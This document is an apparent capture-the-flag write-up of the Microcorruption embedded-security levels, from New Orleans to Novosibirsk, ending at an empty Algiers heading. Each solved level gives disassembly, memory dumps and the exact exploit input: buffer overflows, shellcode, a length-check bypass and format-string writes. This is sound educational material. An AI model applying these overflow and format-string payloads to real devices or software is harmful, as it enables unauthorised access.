 ## Table of Contents
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [New Orleans](#new-orleans)
- [Sydney](#sydney)
- [Hanoi](#hanoi)
- [Cusco](#cusco)
- [Reykjavik](#reykjavik)
- [Whitehorse](#whitehorse)
- [Montevideo](#montevideo)
- [Johannesburg](#johannesburg)
- [Santa Cruz](#santa-cruz)
- [Jakarta](#jakarta)
- [Addis Ababa](#addis-ababa)
- [Novosibirsk](#novosibirsk)
- [Algiers](#algiers)
- [Vladivostok](#vladivostok)
- [Bangalore](#bangalore)
- [Lagos](#lagos)

## Introduction

Welcome to my exploit write up on the embedded security challenges from the website [Microcorruption](https://microcorruption.com/). 

## New Orleans


Just looking through the disassembly you can see a fishy function right off the bat. We can see a function called create_password, which if we look at it we see it adding hex codes to memory address r15. If we convert those hexcodes to ascii we can see that it makes, NMTIhRY. If we enter that in as the password, we unlock the door, meaning we solved this challenge.

```asm
447e <create_password>
447e:  3f40 0024      mov	#0x2400, r15
4482:  ff40 4e00 0000 mov.b	#0x4e, 0x0(r15)
4488:  ff40 4d00 0100 mov.b	#0x4d, 0x1(r15)
448e:  ff40 5400 0200 mov.b	#0x54, 0x2(r15)
4494:  ff40 4900 0300 mov.b	#0x49, 0x3(r15)
449a:  ff40 6800 0400 mov.b	#0x68, 0x4(r15)
44a0:  ff40 5200 0500 mov.b	#0x52, 0x5(r15)
44a6:  ff40 5900 0600 mov.b	#0x59, 0x6(r15)
44ac:  cf43 0700      mov.b	#0x0, 0x7(r15)
44b0:  3041           ret
```

### Solved

Password = NMTIhRY

## Sydney


Looking at the disassembly this time there isn't any fishy functions like create_password. If we look at the check_password function this time we see that it is comparing hexcodes to the memory address location r15. If look at 
location 444a in the main function. We can see that the after getting the password the program puts the stack pointer into the r15 memory address. Which means the program is comparing the hexcodes to the password. If we enter in the hexcodes, 2d28462c5827735f, as the password the door fails to unlock. This doesn't mean our assumptions wrong, because if we swap the hexcode pairs 282d2c4627585f73, the door unlocks. The reason that worked is because of endianness swaps them during execution.

```asm
4438 <main>
4438:  3150 9cff      add	#0xff9c, sp
443c:  3f40 b444      mov	#0x44b4 "Enter the password to continue.", r15
4440:  b012 6645      call	#0x4566 <puts>
4444:  0f41           mov	sp, r15
4446:  b012 8044      call	#0x4480 <get_password>
444a:  0f41           mov	sp, r15
444c:  b012 8a44      call	#0x448a <check_password>
4450:  0f93           tst	r15
4452:  0520           jnz	#0x445e <main+0x26>
4454:  3f40 d444      mov	#0x44d4 "Invalid password; try again.", r15
4458:  b012 6645      call	#0x4566 <puts>
445c:  093c           jmp	#0x4470 <main+0x38>
445e:  3f40 f144      mov	#0x44f1 "Access Granted!", r15
4462:  b012 6645      call	#0x4566 <puts>
4466:  3012 7f00      push	#0x7f
446a:  b012 0245      call	#0x4502 <INT>
446e:  2153           incd	sp
4470:  0f43           clr	r15
4472:  3150 6400      add	#0x64, sp

448a <check_password>
448a:  bf90 282d 0000 cmp	#0x2d28, 0x0(r15)
4490:  0d20           jnz	$+0x1c
4492:  bf90 2c46 0200 cmp	#0x462c, 0x2(r15)
4498:  0920           jnz	$+0x14
449a:  bf90 2758 0400 cmp	#0x5827, 0x4(r15)
44a0:  0520           jne	#0x44ac <check_password+0x22>
44a2:  1e43           mov	#0x1, r14
44a4:  bf90 5f73 0600 cmp	#0x735f, 0x6(r15)
44aa:  0124           jeq	#0x44ae <check_password+0x24>
44ac:  0e43           clr	r14
44ae:  0f4e           mov	r14, r15
44b0:  3041           ret
```

### Solved

Password = 282d2c4627585f73

## Hanoi


If we run the program we get the message that passwords can only be as big as 16 characters. We can test that restraint by entering a ton of As as the password. If we look at the login function and put a breakpoint at location 455a. We can see that the program is looking for hexcode cb at the memory location 2410. If we look at that memory location we can see that we are overwrote that location with As. So, let's see if adding hexcode cb to that location will unlock the door. If we pad the password with 16 hexcode 41s, then add the hexcode cb at the end. We can see that this password unlocks the door solving the challenge.

```asm
4520 <login>
4520:  c243 1024      mov.b	#0x0, &0x2410
4524:  3f40 7e44      mov	#0x447e "Enter the password to continue.", r15
4528:  b012 de45      call	#0x45de <puts>
452c:  3f40 9e44      mov	#0x449e "Remember: passwords are between 8 and 16 characters.", r15
4530:  b012 de45      call	#0x45de <puts>
4534:  3e40 1c00      mov	#0x1c, r14
4538:  3f40 0024      mov	#0x2400, r15
453c:  b012 ce45      call	#0x45ce <getsn>
4540:  3f40 0024      mov	#0x2400, r15
4544:  b012 5444      call	#0x4454 <test_password_valid>
4548:  0f93           tst	r15
454a:  0324           jz	$+0x8
454c:  f240 3000 1024 mov.b	#0x30, &0x2410
4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
4556:  b012 de45      call	#0x45de <puts>
455a:  f290 cb00 1024 cmp.b	#0xcb, &0x2410
4560:  0720           jne	#0x4570 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
456e:  3041           ret
4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
4574:  b012 de45      call	#0x45de <puts>
4578:  3041           ret



2400:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
2410:   4141 4141 4141 4141 4141 4141 0000 0000   AAAAAAAAAAAA....
2420:   0000 0000 0000 0000 0000 0000 0000 0000   ................
```

### Solved

Password = 41414141414141414141414141414141cb

## Cusco


When we put in a password longer than 16 characters we get this message, "insn address unaligned", in the debugger console. Normally the message is "CPUOFF flag set; program no longer running. CPU must now be reset". This means we are possible overwritting the instruction pointer. If we use the password, ABCDEFGHIJKLMNOPQRSTUVWXYZ, and put a breakpoint on the return call in the login function. If we step once we see that in the instruction pointer is 5251 or RQ. That means we are overwriting the pointer. If we add the location of the unlock_door function, 4446, in place RQ in our password, we can get the program to go there and unlock the door for us. Converting the everything to hex and swapping the unlock_door function's location for endianness solves this challenge.

### Solved

Password = 414243444546474849505152535455564644

## Reykjavik


For this challenge the functions being ran are encrypted at. To figure this out we can get all the current instructions that are ran after a password is entered in. Once we have how the password is checked we can see that it is only compared to if the hexcode of the password equals 0x29cf. That is all we have to enter in to unlock the door.

```asm
pop sr
ret
add #0x6, sp
cmp #0x29cf, -0x24(r4)
jnz $+0xc
add #0x20, sp
pop r4
pop r11
ret
clr r15
bis #0xf0, sr
jmp $-0x4
```

### Solved

password = cf29

## Whitehorse


If we enter a password greater than 16 characters we get the error "insn address unaligned" again meaning we are overwriting the instruction pointer. Unlike the level, Hanoi, there is no function we can call to unlock the door. This means we need to make our own function that unlocks the door. How we will do this is be looking in the manual for the different types of interrupts. The 0x7f interrupt will unlock the door for us, and it doesn't require any arguments to do so. Now we can use the assembly tool to assemble our function and get it's shell code, 30127f00b0123245. Next we will enter the alphabet and see where we overwrite the instruction pointer at. The instruction pointer this time has 5251 or RQ in it. This means the instruction pointer is overwritten after exactly 16 characters. Now we need to tell it where to point to which the stack where the user entered password is, is a great place because our shellcode will be there. Looking at the memory dump window we see that the user entered password is located at 3aae. Which means that needs to be after 16 characters in the password. The shellcode we have only takes up 8 characters, so we need 8 more to pad the password with. Entering the our created password solves the challenge.

```asm
push #0x7f
call #0x4532


3a90:   0000 0000 0000 0000 0000 0000 4645 0100   ............FE..
3aa0:   4645 0300 ba45 0000 0a00 0000 2a45 4142   FE...E......*EAB
3ab0:   4344 4546 4748 494a 4b4c 4d4e 4f50 5152   CDEFGHIJKLMNOPQR
3ac0:   5354 5556 5758 595a 0000 0000 0000 0000   STUVWXYZ........
```

### Solved

password = 30127f00b01232454141414141414141ae3a

## Montevideo


Just like the last level we are getting the error, "insn address unaligned", when we enter a password greater than 16 characters. We need to make our own function that unlocks the door again. This time though the shellcode has to contains no 0x00 hexcode, this is because of the strcpy function. Strcpy copies the user password from it's location on the stack to where the stack pointer is. It will stop copying if there is a 0x00 hexcode, so we need to avoid using any. This time we need to add a whole word to the stack, but the interrupt is only one byte. So we need to use a and opcode to get set it to 0x7f using only words. We can then call the interrupt when 0x7f is on the stack, unlocking the door. Now we can use the assembly tool to assemble our function and get it's shell code, 34507f2234f0ff110412b0124c45. Next we will enter the alphabet and see where we overwrite the instruction pointer at. The instruction pointer this time has 5251 or RQ in it. This means the instruction pointer is overwritten after exactly 16 characters. Now we need to tell it where to point to which the stack where the user entered password is, is a great place because our shellcode will be there. Looking at the memory dump window we see that the user entered password is located at 43ee. Which means that needs to be after 16 characters in the password. The shellcode we have only takes up 14 characters, so we need 2 more to pad the password with. Entering the our created password solves the challenge.

```asm
add #0x227f, r4
and #0x11ff, r4
push r4
call #0x454c


43e0:   6045 0300 d445 0000 0a00 0000 4445 4142   `E...E......DEAB
43f0:   4344 4546 4748 494a 4b4c 4f4d 4e4f 5051   CDEFGHIJKLOMNOPQ
4400:   5253 5455 5657 5859 5a00 35d0 085a 3f40   RSTUVWXYZ.5..Z?@
```

### Solved

password = 34507f2234f0ff110412b0124c454141ee43

## Johannesburg


Unlike the last couple of challenges this program is checking if the user input is greater than 16. The only problem is at line 4578 in the login function. There it is checking for the hexcode 0x52 17 addresses from the stack pointer, which at the time is pointing at the location of the user input password. This means all we need to do is have hex 52 after 17 characters in the password. If we enter a password with a size greater than 16 characters and at the 18th character is 0x52, then we add the hexcode of the alphabet we get the error "insn address unaligned". In the instruction pointer is 4241 or BA, which means all we need to do is add the location of the unlock_door function, 4446, after the 0x52 in our password. Entering this as the password unlocks the door.

```asm
452c <login>
452c:  3150 eeff      add	#0xffee, sp
4530:  f140 5200 1100 mov.b	#0x52, 0x11(sp)
4536:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
453a:  b012 f845      call	#0x45f8 <puts>
453e:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4542:  b012 f845      call	#0x45f8 <puts>
4546:  3e40 3f00      mov	#0x3f, r14
454a:  3f40 0024      mov	#0x2400, r15
454e:  b012 e845      call	#0x45e8 <getsn>
4552:  3e40 0024      mov	#0x2400, r14
4556:  0f41           mov	sp, r15
4558:  b012 2446      call	#0x4624 <strcpy>
455c:  0f41           mov	sp, r15
455e:  b012 5244      call	#0x4452 <test_password_valid>
4562:  0f93           tst	r15
4564:  0524           jz	#0x4570 <login+0x44>
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
456e:  023c           jmp	#0x4574 <login+0x48>
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 5200 1100 cmp.b	#0x52, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```

### Solved

password = 4141414141414141414141414141414141524644

## Santa Cruz

This challenge we have both a username and password this time. If start the program it states that both should be less than 16 characters. So, to start off if we enter should enter 20 "A"s as the username and password. The first problem is the cmp op code on 4600 in the login function. Once the code reaches there it exits, while printing "Invalid Password Length: password too short.". If we set a breakpoint there we can see that r11 and r15 are being compared with each other. r11 has hex 14 in it and r15 has hex 41. We can see that whatever was suppose to be in r15 was overwritten with an A and r11 is 20 decimal or the size of the inputs we entered. If we check the next line jumps to the exit code, if r15 is greater than r11. So, since we know that we can overwrite the value what if we enter a smaller number there. If we see on line 45fa, r15 is 19 hex minus r4, which is 43cc, which equals 43b3. If we look at the memory dump that location is where our inputs are stored and it is 17 characters from the start. So we need 17 characters than a small number in the username.

```asm
pc  4600  sp  43a0  sr  0005  cg  0000
r04 43cc  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0014
r12 0000  r13 43c9  r14 43c9  r15 0041

4390:   0000 d846 0300 4c47 0000 0a00 0000 d045   ...F..LG.......E
43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
43b0:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
43c0:   4141 4141 4141 4141 4141 0000 4044 0000   AAAAAAAAAA..@D..
```

This time we enter 41414141414141414141414141414141410141 as the username and 20 "A"s again as the password. This time when we at the compare at line 4600 we pass it and continue on with the code. The problem this time is line, 4650. At this line the code jumps to an exit if this is not a 0 at the memory location 6 hex minus r4, or 43cc, which equals 43c6. At that memory location is an A or hex 41 not a 0. What we can do is shorten the password so there is a 0 there.

```asm
pc  45ea  sp  43a0  sr  0001  cg  0000
r04 43cc  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0014
r12 0000  r13 43c9  r14 43c9  r15 0001

4390:   0000 d846 0300 4c47 0000 0a00 1400 4c46   ...F..LG......LF
43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
43b0:   4141 4101 4141 4141 4141 4141 4141 4141   AAA.AAAAAAAAAAAA
43c0:   4141 4141 4141 4141 4100 0000 4044 0000   AAAAAAAAA...@D..
```

So this time we enter 41414141414141414141414141414141410141 as the username and 16 "A"s again as the password. We pass the compares and reach the return code this time. We can now see that the return address is stored at 43cc, which is somewhere we can overwrite it. The problem is we need a 0 at the memory location 43c6. If we think about how the function strcpy works it adds a null byte at the end of the string it is copying. So if we make the username long enough to overwrite the return address to the unlock_door address, 444a. We can have the password small enough to, so when it gets copied it replaces whatever is at 43c6 with a 0. Creating this username and password solves the challenge.

```asm
pc  4666  sp  43cc  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 43c4  r14 0000  r15 0000

4390:   0000 d846 0300 4c47 0000 0a00 0f00 4c46   ...F..LG......LF
43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
43b0:   4141 4101 4141 4141 4141 4141 4141 4141   AAA.AAAAAAAAAAAA
43c0:   4141 4141 0000 0000 0000 0000 4044 0000   AAAA........@D..
```

```asm
444a <unlock_door>
444a:  3012 7f00      push	#0x7f
444e:  b012 c446      call	#0x46c4 <INT>
4452:  2153           incd	sp
4454:  3041           ret


4550 <login>
4550:  0b12           push	r11
4552:  0412           push	r4
4554:  0441           mov	sp, r4
4556:  2452           add	#0x4, r4
4558:  3150 d8ff      add	#0xffd8, sp
455c:  c443 faff      mov.b	#0x0, -0x6(r4)
4560:  f442 e7ff      mov.b	#0x8, -0x19(r4)
4564:  f440 1000 e8ff mov.b	#0x10, -0x18(r4)
456a:  3f40 8444      mov	#0x4484 "Authentication now requires a username and password.", r15
456e:  b012 2847      call	#0x4728 <puts>
4572:  3f40 b944      mov	#0x44b9 "Remember: both are between 8 and 16 characters.", r15
4576:  b012 2847      call	#0x4728 <puts>
457a:  3f40 e944      mov	#0x44e9 "Please enter your username:", r15
457e:  b012 2847      call	#0x4728 <puts>
4582:  3e40 6300      mov	#0x63, r14
4586:  3f40 0424      mov	#0x2404, r15
458a:  b012 1847      call	#0x4718 <getsn>
458e:  3f40 0424      mov	#0x2404, r15
4592:  b012 2847      call	#0x4728 <puts>
4596:  3e40 0424      mov	#0x2404, r14
459a:  0f44           mov	r4, r15
459c:  3f50 d6ff      add	#0xffd6, r15
45a0:  b012 5447      call	#0x4754 <strcpy>
45a4:  3f40 0545      mov	#0x4505 "Please enter your password:", r15
45a8:  b012 2847      call	#0x4728 <puts>
45ac:  3e40 6300      mov	#0x63, r14
45b0:  3f40 0424      mov	#0x2404, r15
45b4:  b012 1847      call	#0x4718 <getsn>
45b8:  3f40 0424      mov	#0x2404, r15
45bc:  b012 2847      call	#0x4728 <puts>
45c0:  0b44           mov	r4, r11
45c2:  3b50 e9ff      add	#0xffe9, r11
45c6:  3e40 0424      mov	#0x2404, r14
45ca:  0f4b           mov	r11, r15
45cc:  b012 5447      call	#0x4754 <strcpy>
45d0:  0f4b           mov	r11, r15
45d2:  0e44           mov	r4, r14
45d4:  3e50 e8ff      add	#0xffe8, r14
45d8:  1e53           inc	r14
45da:  ce93 0000      tst.b	0x0(r14)
45de:  fc23           jnz	#0x45d8 <login+0x88>
45e0:  0b4e           mov	r14, r11
45e2:  0b8f           sub	r15, r11
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11
45ec:  0628           jnc	#0x45fa <login+0xaa>
45ee:  1f42 0024      mov	&0x2400, r15
45f2:  b012 2847      call	#0x4728 <puts>
45f6:  3040 4044      br	#0x4440 <__stop_progExec__>
45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
45fe:  8f11           sxt	r15
4600:  0b9f           cmp	r15, r11
4602:  062c           jc	#0x4610 <login+0xc0>
4604:  1f42 0224      mov	&0x2402, r15
4608:  b012 2847      call	#0x4728 <puts>
460c:  3040 4044      br	#0x4440 <__stop_progExec__>
4610:  c443 d4ff      mov.b	#0x0, -0x2c(r4)
4614:  3f40 d4ff      mov	#0xffd4, r15
4618:  0f54           add	r4, r15
461a:  0f12           push	r15
461c:  0f44           mov	r4, r15
461e:  3f50 e9ff      add	#0xffe9, r15
4622:  0f12           push	r15
4624:  3f50 edff      add	#0xffed, r15
4628:  0f12           push	r15
462a:  3012 7d00      push	#0x7d
462e:  b012 c446      call	#0x46c4 <INT>
4632:  3152           add	#0x8, sp
4634:  c493 d4ff      tst.b	-0x2c(r4)
4638:  0524           jz	#0x4644 <login+0xf4>
463a:  b012 4a44      call	#0x444a <unlock_door>
463e:  3f40 2145      mov	#0x4521 "Access granted.", r15
4642:  023c           jmp	#0x4648 <login+0xf8>
4644:  3f40 3145      mov	#0x4531 "That password is not correct.", r15
4648:  b012 2847      call	#0x4728 <puts>
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	#0x465e <login+0x10e>
4652:  1f42 0024      mov	&0x2400, r15
4656:  b012 2847      call	#0x4728 <puts>
465a:  3040 4044      br	#0x4440 <__stop_progExec__>
465e:  3150 2800      add	#0x28, sp
4662:  3441           pop	r4
4664:  3b41           pop	r11
4666:  3041           ret
```

### Solved

username = 4141414141414141414141414141414141014141414141414141414141414141414141414141414141414a44
password = 4141414141414141414141414141414141

## Jakarta


Like the last challenge this one also requires a username and password. If we enter a password that is greater that 32 characters the program exits without allowing us to enter a password. The program prints this when exiting "Invalid Password Length: password too long.", which is weird, because we enter a long username not password. So, next time running the program we enter 32 "A"s as the username. This time we get the password prompt. If we enter another 32 "A"s, we exit the program and get the message "Invalid Password Length: password too long.". If we look at line 4600, this is where the program is making the compare to see if the username and password combo is too long. We can see that it is looking for less than 21 hex or 33 characters in both the username and password, which there combined character amount is stored in r15. If we look back at how r15 is calculated, the start of the user input for the password, is put into r15 and then r15 get added by 1 till there is a 0 at the location that's in r15. Then the start location of the password is subtracted from r15. This gets the amount of characters entered in, then that is added with the previous number gotten from the username character amount. r15 is then checked to see if it less than 21 hex, which as we can see it is 40 hex, so the program will exit. But, cmp.b only compares the last byte, so if the password character amount is greater than 100 hex, or 256, and is less than 121 hex, or 289.

```asm
pc  4600  sp  3ff2  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0020
r12 0000  r13 4032  r14 2422  r15 0040
```

If we enter the 32 "A"s as the username and 256 "A"s as the password, so this time we can pass all the user input size checks. This time we reached the return code. If we see the return code was saved at memory location 4016. But, that has been overwritten by our user input. If we look we overwrite the password after 36 character. So, all we need to do is, after 4 "A"s in the password input we put 4c44 or the location of the unlock_door function. Doing this solves the challenge.

```asm
pc  4634  sp  4016  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 4141
r12 0000  r13 4112  r14 0000  r15 0000

3fe0:   7846 0100 7846 0300 ec46 0000 0a00 2000   xF..xF...F.... .
3ff0:   2e46 4141 4141 4141 4141 4141 4141 4141   .FAAAAAAAAAAAAAA
4000:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
4010:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
4020:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
4030:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
```

```asm
444c <unlock_door>
444c:  3012 7f00      push	#0x7f
4450:  b012 6446      call	#0x4664 <INT>
4454:  2153           incd	sp
4456:  3041           ret


4560 <login>
4560:  0b12           push	r11
4562:  3150 deff      add	#0xffde, sp
4566:  3f40 8244      mov	#0x4482 "Authentication requires a username and password.", r15
456a:  b012 c846      call	#0x46c8 <puts>
456e:  3f40 b344      mov	#0x44b3 "Your username and password together may be no more than 32 characters.", r15
4572:  b012 c846      call	#0x46c8 <puts>
4576:  3f40 fa44      mov	#0x44fa "Please enter your username:", r15
457a:  b012 c846      call	#0x46c8 <puts>
457e:  3e40 ff00      mov	#0xff, r14
4582:  3f40 0224      mov	#0x2402, r15
4586:  b012 b846      call	#0x46b8 <getsn>
458a:  3f40 0224      mov	#0x2402, r15
458e:  b012 c846      call	#0x46c8 <puts>
4592:  3f40 0124      mov	#0x2401, r15
4596:  1f53           inc	r15
4598:  cf93 0000      tst.b	0x0(r15)
459c:  fc23           jnz	#0x4596 <login+0x36>
459e:  0b4f           mov	r15, r11
45a0:  3b80 0224      sub	#0x2402, r11
45a4:  3e40 0224      mov	#0x2402, r14
45a8:  0f41           mov	sp, r15
45aa:  b012 f446      call	#0x46f4 <strcpy>
45ae:  7b90 2100      cmp.b	#0x21, r11
45b2:  0628           jnc	#0x45c0 <login+0x60>
45b4:  1f42 0024      mov	&0x2400, r15
45b8:  b012 c846      call	#0x46c8 <puts>
45bc:  3040 4244      br	#0x4442 <__stop_progExec__>
45c0:  3f40 1645      mov	#0x4516 "Please enter your password:", r15
45c4:  b012 c846      call	#0x46c8 <puts>
45c8:  3e40 1f00      mov	#0x1f, r14
45cc:  0e8b           sub	r11, r14
45ce:  3ef0 ff01      and	#0x1ff, r14
45d2:  3f40 0224      mov	#0x2402, r15
45d6:  b012 b846      call	#0x46b8 <getsn>
45da:  3f40 0224      mov	#0x2402, r15
45de:  b012 c846      call	#0x46c8 <puts>
45e2:  3e40 0224      mov	#0x2402, r14
45e6:  0f41           mov	sp, r15
45e8:  0f5b           add	r11, r15
45ea:  b012 f446      call	#0x46f4 <strcpy>
45ee:  3f40 0124      mov	#0x2401, r15
45f2:  1f53           inc	r15
45f4:  cf93 0000      tst.b	0x0(r15)
45f8:  fc23           jnz	#0x45f2 <login+0x92>
45fa:  3f80 0224      sub	#0x2402, r15
45fe:  0f5b           add	r11, r15
4600:  7f90 2100      cmp.b	#0x21, r15
4604:  0628           jnc	#0x4612 <login+0xb2>
4606:  1f42 0024      mov	&0x2400, r15
460a:  b012 c846      call	#0x46c8 <puts>
460e:  3040 4244      br	#0x4442 <__stop_progExec__>
4612:  0f41           mov	sp, r15
4614:  b012 5844      call	#0x4458 <test_username_and_password_valid>
4618:  0f93           tst	r15
461a:  0524           jz	#0x4626 <login+0xc6>
461c:  b012 4c44      call	#0x444c <unlock_door>
4620:  3f40 3245      mov	#0x4532 "Access granted.", r15
4624:  023c           jmp	#0x462a <login+0xca>
4626:  3f40 4245      mov	#0x4542 "That password is not correct.", r15
462a:  b012 c846      call	#0x46c8 <puts>
462e:  3150 2200      add	#0x22, sp
4632:  3b41           pop	r11
4634:  3041           ret
```

### Solved

username = 4141414141414141414141414141414141414141414141414141414141414141
password = 414141414c4441414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141

## Addis Ababa


This challenge is a simple format string exploit. If we enter 3 "%x" as the password we get 7825 in the printf which means we have access to whatever we enter in as user input. So, if we look at line 448a, the program is checking if at the stack pointer location which is 347eis 0 or not. If it is 0, then the program exits, if not then the door is unlocked. Since we have access to whatever we put in as the user input, if we enter the stack pointer location we can use "%n" to change the value. Creating the password is easy now, we just have the stack pointer location, "%x" for padding, then a "%n" to change its value. This password solves the challenge.

```asm
pc  448a  sp  347e  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 3480
r12 3482  r13 0002  r14 0000  r15 000a


4438 <main>
4438:  3150 eaff      add	#0xffea, sp
443c:  8143 0000      clr	0x0(sp)
4440:  3012 e644      push	#0x44e6 "Login with username:password below to authenticate.\n"
4444:  b012 c845      call	#0x45c8 <printf>
4448:  b140 1b45 0000 mov	#0x451b ">> ", 0x0(sp)
444e:  b012 c845      call	#0x45c8 <printf>
4452:  2153           incd	sp
4454:  3e40 1300      mov	#0x13, r14
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8c45      call	#0x458c <getsn>
4460:  0b41           mov	sp, r11
4462:  2b53           incd	r11
4464:  3e40 0024      mov	#0x2400, r14
4468:  0f4b           mov	r11, r15
446a:  b012 de46      call	#0x46de <strcpy>
446e:  3f40 0024      mov	#0x2400, r15
4472:  b012 b044      call	#0x44b0 <test_password_valid>
4476:  814f 0000      mov	r15, 0x0(sp)
447a:  0b12           push	r11
447c:  b012 c845      call	#0x45c8 <printf>
4480:  2153           incd	sp
4482:  3f40 0a00      mov	#0xa, r15
4486:  b012 5045      call	#0x4550 <putchar>
448a:  8193 0000      tst	0x0(sp)
448e:  0324           jz	#0x4496 <main+0x5e>
4490:  b012 da44      call	#0x44da <unlock_door>
4494:  053c           jmp	#0x44a0 <main+0x68>
4496:  3012 1f45      push	#0x451f "That entry is not valid."
449a:  b012 c845      call	#0x45c8 <printf>
449e:  2153           incd	sp
44a0:  0f43           clr	r15
44a2:  3150 1600      add	#0x16, sp
```

### Solved

password = 7e342578256e

## Novosibirsk


Just like the last challenge this one also requires us to do a format string exploit. This time though there is no unlock_door function to call. What we can do is overwrite some code and insert our own using the format string exploit. The question is what. The best thing to overwrite is line 44c6 in the conditional_unlock_door function. This line adds 0x7e to the stack to tell the interrupt function to check if the password is correct. If it is the door will unlock the door. We change overwrite 0x7e and change it to 0x7f, which will unlock the door no matter what. The stack address 44c8 is where 0x7e is located, so we need to add that address to the password string we give, so we can manipulate it. We will start with the password c84478256e25 to see if we change 0x7e. If we add a breakpoint to line 44c6 and see what instruction is there. We can see that it is not "push #0x3", which means we were able to overwrite the 0x7e. Now the problem is how do we insert 0x7f there since the value now is 0x3. That's actually easy we just need to pad the password with bytes till it adds to 0x7f or 127. Since we inserted 3 bytes we need to add 124 more using "A"s. So adding 124 "A"s to our password before the "%n" will solve the challenge.

```asm
Current Instruction
3012 0300
push #0x3

4438 <main>
4438:  0441           mov	sp, r4
443a:  2453           incd	r4
443c:  3150 0cfe      add	#0xfe0c, sp
4440:  3012 da44      push	#0x44da "Enter your username below to authenticate.\n"
4444:  b012 c645      call	#0x45c6 <printf>
4448:  b140 0645 0000 mov	#0x4506 ">> ", 0x0(sp)
444e:  b012 c645      call	#0x45c6 <printf>
4452:  2153           incd	sp
4454:  3e40 f401      mov	#0x1f4, r14
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8a45      call	#0x458a <getsn>
4460:  3e40 0024      mov	#0x2400, r14
4464:  0f44           mov	r4, r15
4466:  3f50 0afe      add	#0xfe0a, r15
446a:  b012 dc46      call	#0x46dc <strcpy>
446e:  3f40 0afe      mov	#0xfe0a, r15
4472:  0f54           add	r4, r15
4474:  0f12           push	r15
4476:  b012 c645      call	#0x45c6 <printf>
447a:  2153           incd	sp
447c:  3f40 0a00      mov	#0xa, r15
4480:  b012 4e45      call	#0x454e <putchar>
4484:  0f44           mov	r4, r15
4486:  3f50 0afe      add	#0xfe0a, r15
448a:  b012 b044      call	#0x44b0 <conditional_unlock_door>
448e:  0f93           tst	r15
4490:  0324           jz	#0x4498 <main+0x60>
4492:  3012 0a45      push	#0x450a "Access Granted!"
4496:  023c           jmp	#0x449c <main+0x64>
4498:  3012 1a45      push	#0x451a "That username is not valid."
449c:  b012 c645      call	#0x45c6 <printf>
44a0:  0f43           clr	r15
44a2:  3150 f601      add	#0x1f6, sp


44b0 <conditional_unlock_door>
44b0:  0412           push	r4
44b2:  0441           mov	sp, r4
44b4:  2453           incd	r4
44b6:  2183           decd	sp
44b8:  c443 fcff      mov.b	#0x0, -0x4(r4)
44bc:  3e40 fcff      mov	#0xfffc, r14
44c0:  0e54           add	r4, r14
44c2:  0e12           push	r14
44c4:  0f12           push	r15
44c6:  3012 7e00      push	#0x7e
44ca:  b012 3645      call	#0x4536 <INT>
44ce:  5f44 fcff      mov.b	-0x4(r4), r15
44d2:  8f11           sxt	r15
44d4:  3152           add	#0x8, sp
44d6:  3441           pop	r4
44d8:  3041           ret
```

### Solved

password = c8444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414178256e25

## Algiers


